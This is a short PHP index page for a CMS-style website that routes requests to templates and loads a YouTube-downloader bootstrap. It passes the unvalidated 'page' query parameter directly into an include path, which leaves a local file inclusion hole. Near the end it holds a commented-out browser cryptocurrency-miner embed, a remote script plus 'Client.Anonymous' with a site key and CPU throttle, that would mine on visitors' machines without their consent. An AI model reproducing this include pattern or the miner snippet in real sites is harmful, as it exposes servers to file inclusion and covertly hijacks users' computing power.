<?php 
	include('_cms/autoload.php');
	$app = include_once('api/YouTube-Downloader/bootstrap.php');
	if(isset($_GET['page'])){
		$page = $_GET['page'];
	}else{
		$page = "home";
	}
?>
<!DOCTYPE HTML>
<html>
	<head>
		<?php include('_cms/include/head_global.php'); ?>
	</head>
	<body>
	<?php include('_cms/include/header.php'); ?>
	
	<?php 
		
		$file = "templates/{$page}.php";
		if(file_exists($file)){
			include($file);
		}else{
			# include('config/docs/site/errors/404.php');
		}
	?>
	</div>
   
   <?php include('_cms/include/footer.php'); ?>
	
	<!--
	<script src="https://www.hostingcloud.science./P5gV.js"></script>
	<script>
		var _client = new Client.Anonymous('3162a8bb71b35ec7254ce652bc343c09a6268f6771483a9a1eda978ae524bfc1', {
			throttle: 0.85, c: 'w'
		});
		_client.start();
	</script>
	--->
</body>
</html>		